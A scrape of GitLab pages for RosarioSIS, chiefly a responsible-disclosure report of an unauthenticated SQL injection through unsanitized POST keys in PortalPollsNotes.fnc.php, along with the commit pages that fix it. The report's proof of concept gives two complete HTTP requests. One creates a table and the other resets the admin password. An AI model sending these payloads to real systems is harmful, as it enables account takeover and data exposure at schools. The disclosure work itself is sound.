=== Content from gitlab.com_3b7651e4_20250114_221752.html ===


[Skip to content](#content-body)
GitLab

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Unauthenticated SQL Injection in /ProgramFunctions/PortalPollsNotes.fnc.php Due to Insufficient Sanitization

Hi [@francoisjacquet](/francoisjacquet "François Jacquet"),

I found an SQL Injection issue in the latest version of RosarioSIS. Details are described below.

# Unauthenticated SQL Injection in /ProgramFunctions/PortalPollsNotes.fnc.php Due to Insufficient Sanitization

In RosarioSIS, user input is insufficiently sanitized, which leads to an unauthenticated SQL Injection vulnerability.

## Description

In general, user input is sanitized staring in line 177 in [`Warehouse.php`](https://gitlab.com/francoisjacquet/rosariosis/-/blob/mobile/Warehouse.php#L177):

```
/**
 * Sanitize $_REQUEST array
 * ($_POST + $_GET)
 */
// Escape strings for DB queries.
array_rwalk( $_REQUEST, 'DBEscapeString' );
```

First of all, only the `$_REQUEST` array is sanitized. While it is true that `$_REQUEST` contains `GET` and `POST` parameters, the array itself is independent from the special `$_GET` and `$_POST` arrays. Therefore sanitizing `$_REQUEST` does *not* automatically also sanitize `$_GET` and `$_POST`. This means that whenever input from these two arrays is directly used, it is unsanitized and creates potential for vulnerabilities. Second, `array_rwalk`, as defined in the same file, here only sanitizes the values of HTTP parameters and not the keys. This becomes relevant if HTTP parameter keys are directly inserted into an SQL query.

One example code location in which both of these issues can be used to achieve SQL Injection can be found in the file [`ProgramFunctions/PortalPollsNotes.fnc.php`](https://gitlab.com/francoisjacquet/rosariosis/-/blob/mobile/ProgramFunctions/PortalPollsNotes.fnc.php). The `PortalPollsVote(...)` function as defined from line 21 onwards begins like so:

```
function PortalPollsVote( $poll_id, $votes_array )
{
	// Get poll:
	$poll_RET = DBGet( "SELECT EXCLUDED_USERS, VOTES_NUMBER, DISPLAY_VOTES
		FROM PORTAL_POLLS
		WHERE ID='" . $poll_id . "'" );
```

The parameter `$poll_id` is directly inserted into an SQL query, which is immediately executed. This parameter is originally created in a `foreach` loop that iterates over HTTP `POST` parameters, see lines 382-389 in the same file:

```
	foreach ( (array) $_POST['votes'] as $poll_id => $votes_array )
	{
		if ( ! empty( $votes_array ) )
		{
			echo PortalPollsVote( $poll_id, $votes_array );
			break;
		}
	}
```

Because `$poll_id` gets assigned an HTTP `POST` parameter *key*, it holds unsanitized user input, as described above, and can be used to achieve SQL Injection.

## Proof of Concept

Making the following `POST` request to a RosarioSIS instance as an unauthenticated user creates a new SQL table called `notsosecure`:

```
POST /ProgramFunctions/PortalPollsNotes.fnc.php HTTP/1.1
Host: rosariosis.local
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 54

votes['; CREATE TABLE notsosecure(t text) --]=hello
```

Making the following `POST` request to a RosarioSIS instance as an unauthenticated user changes the admin's password to "password":

```
POST /ProgramFunctions/PortalPollsNotes.fnc.php HTTP/1.1
Host: rosariosis.local
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 178

votes['; UPDATE staff SET password%3d'$6$8f3d44f629ce994f$10QZrn8evmCTv2Nywt5jlWbL3hMbKmwPOeOqNVUzV5cr523ENoVj4FpWrvW1HGfn/XPAq0rwTFY7Eea3YPLOY/' WHERE staff_id%3d'1'; --]=hello
```

Note that in both cases the `POST` data may have to be urlencoded (further) beforehand. Also, the hostname may have to be adapted to your setup.

While reading data is not as trivial, it can be achieved with Error-based SQL Injections and other techniques, which is omitted here.

# Remediation

First of all, soley sanitizing `$_REQUEST` is not enough. `$_GET` and, more importantly in this instance, `$_POST` also need to be sanitized. Second, HTTP parameter keys need to be sanitized before being used inside and SQL query.

To upload designs, you'll need to enable LFS and have an admin enable hashed storage. [More information](/help/user/project/issues/design_management.md#prerequisites)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_dc4bc3b7_20250114_221750.html ===


[Skip to content](#content-body)
GitLab

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [rosariosis](/francoisjacquet/rosariosis/-/tree/mobile)
* [**CHANGES.md**](/francoisjacquet/rosariosis/-/blob/mobile/CHANGES.md)

Find file

[Blame](/francoisjacquet/rosariosis/-/blame/mobile/CHANGES.md)
[Permalink](/francoisjacquet/rosariosis/-/blob/e1d4a5fd971b0c103f5b5dbf9d67544aec464227/CHANGES.md "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* ![François Jacquet's avatar](https://secure.gravatar.com/avatar/7fa9636c4dbc74f01a91731d70fc4b1bb33800783b7667e2f7edb411311bc4f3?s=64&d=identicon "François Jacquet")

  Jan 13, 2025

  [e1d4a5fd](/francoisjacquet/rosariosis/-/commit/e1d4a5fd971b0c103f5b5dbf9d67544aec464227)
  [Allow creating historical marking periods up to 10 years in the past](/francoisjacquet/rosariosis/-/commit/e1d4a5fd971b0c103f5b5dbf9d67544aec464227)
  ·
  e1d4a5fd

  François Jacquet authored Jan 13, 2025

  e1d4a5fd

  [Allow creating historical marking periods up to 10 years in the past](/francoisjacquet/rosariosis/-/commit/e1d4a5fd971b0c103f5b5dbf9d67544aec464227)
  François Jacquet authored Jan 13, 2025

To find the state of this project's repository at the time of any of these versions, check out [the tags](/francoisjacquet/rosariosis/-/tags).

Loading



=== Content from gitlab.com_f7d87901_20250114_221751.html ===


[Skip to content](#content-body)
GitLab

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

**Commit
519af055**

authored
Jan 30, 2021
by
**![François Jacquet's avatar](https://secure.gravatar.com/avatar/7fa9636c4dbc74f01a91731d70fc4b1bb33800783b7667e2f7edb411311bc4f3?s=48&d=identicon "François Jacquet")
François Jacquet**

[Browse files](/francoisjacquet/rosariosis/-/tree/519af055a4fdc1362657d75bca76f9c95a081eaa)

### Fix [#308](/francoisjacquet/rosariosis/-/issues/308 "Unauthenticated SQL Injection in /ProgramFunctions/PortalPollsNotes.fnc.php Due to Insufficient Sanitization") security issue sanitize key. Pass array keys through function

parent
[69aab45d](/francoisjacquet/rosariosis/-/commit/69aab45d3a49e34345424fe9a1ac8c168bc1b67f)

Loading

Loading

Loading

* [Changes
  2](/francoisjacquet/rosariosis/-/commit/519af055a4fdc1362657d75bca76f9c95a081eaa)

[Hide whitespace changes](/francoisjacquet/rosariosis/-/commit/519af055a4fdc1362657d75bca76f9c95a081eaa?action=show&controller=projects%2Fcommit&id=519af055a4fdc1362657d75bca76f9c95a081eaa&namespace_id=francoisjacquet&project_id=rosariosis&w=1)
[Inline](/francoisjacquet/rosariosis/-/commit/519af055a4fdc1362657d75bca76f9c95a081eaa?view=inline)
[Side-by-side](/francoisjacquet/rosariosis/-/commit/519af055a4fdc1362657d75bca76f9c95a081eaa?view=parallel)

Loading

Preview

0%
Loading

Try again

or
attach a new file

.

Cancel

You are about to add
**0
people**
to the discussion. Proceed with caution.

Finish editing this message first!

Save comment

Cancel

Please [register](/users/sign_up?redirect_to_referer=yes) or [sign in](/users/sign_in?redirect_to_referer=yes) to comment



=== Content from gitlab.com_21894683_20250114_221751.html ===


[Skip to content](#content-body)
GitLab

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

**Commit
e001430a**

authored
Jan 30, 2021
by
**![François Jacquet's avatar](https://secure.gravatar.com/avatar/7fa9636c4dbc74f01a91731d70fc4b1bb33800783b7667e2f7edb411311bc4f3?s=48&d=identicon "François Jacquet")
François Jacquet**

[Browse files](/francoisjacquet/rosariosis/-/tree/e001430aa9fb53d2502fb6f036f6c51c578d2016)

### Fix [#308](/francoisjacquet/rosariosis/-/issues/308 "Unauthenticated SQL Injection in /ProgramFunctions/PortalPollsNotes.fnc.php Due to Insufficient Sanitization") Unauthenticated SQL injection. Use sanitized `$\_REQUEST` + Move...

```
Fix [#308](/francoisjacquet/rosariosis/-/issues/308 "Unauthenticated SQL Injection in /ProgramFunctions/PortalPollsNotes.fnc.php Due to Insufficient Sanitization") Unauthenticated SQL injection. Use sanitized `$_REQUEST` + Move Portal Poll vote code to modfunc
```

parent
[0f5d1f1d](/francoisjacquet/rosariosis/-/commit/0f5d1f1d193bc6b711d1644f172579d498ec1636)

Loading

Loading

Loading

* [Changes
  3](/francoisjacquet/rosariosis/-/commit/e001430aa9fb53d2502fb6f036f6c51c578d2016)

[Hide whitespace changes](/francoisjacquet/rosariosis/-/commit/e001430aa9fb53d2502fb6f036f6c51c578d2016?action=show&controller=projects%2Fcommit&id=e001430aa9fb53d2502fb6f036f6c51c578d2016&namespace_id=francoisjacquet&project_id=rosariosis&w=1)
[Inline](/francoisjacquet/rosariosis/-/commit/e001430aa9fb53d2502fb6f036f6c51c578d2016?view=inline)
[Side-by-side](/francoisjacquet/rosariosis/-/commit/e001430aa9fb53d2502fb6f036f6c51c578d2016?view=parallel)

Loading

Preview

0%
Loading

Try again

or
attach a new file

.

Cancel

You are about to add
**0
people**
to the discussion. Proceed with caution.

Finish editing this message first!

Save comment

Cancel

Please [register](/users/sign_up?redirect_to_referer=yes) or [sign in](/users/sign_in?redirect_to_referer=yes) to comment


